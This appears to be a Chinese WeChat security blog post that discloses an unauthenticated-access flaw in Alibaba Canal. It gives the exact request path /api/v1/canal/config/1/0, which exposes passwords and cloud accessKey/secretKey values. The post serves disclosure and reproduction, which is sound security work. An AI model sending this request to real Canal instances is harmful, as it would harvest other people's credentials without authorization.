#  Alibaba Canal config云密钥信息泄露

原创 儒道易行  [ 儒道易行 ](javascript:void\(0\);)

**儒道易行** ![]()

微信号 gh_ad128618f5e9

功能介绍 谢天谢地、不忘祖先、敬偎圣贤

____

___发表于_

收录于合集

#网络安全 292 个

#漏洞分析 93 个

#红队攻防 157 个

#渗透实战 107 个

#漏洞复现 150 个

人处在一种默默奋斗的状态，精神就会从琐碎生活中得到升华。

##  **漏洞描述**

由于/api/v1/canal/config 未进行权限验证可直接访问，导致账户密码、accessKey、secretKey等一系列敏感信息泄露

##  **漏洞复现**

访问验证漏洞的url：

    
    
    /api/v1/canal/config/1/0

漏洞证明：

![]()

文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。

免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。

转载声明：儒道易行
拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    CSDN:https://blog.csdn.net/weixin_48899364?type=blog  
    公众号：https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTU2NjA1Mw==&action=getalbum&album_id=1696286248027357190&scene=173&from_msgid=2247485408&from_itemidx=1&count=3&nolastread=1#wechat_redirect  
    博客:https://rdyx0.github.io/  
    先知社区：https://xz.aliyun.com/u/37846  
    SecIN:https://www.sec-in.com/author/3097  
    FreeBuf：https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85  
    

  

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

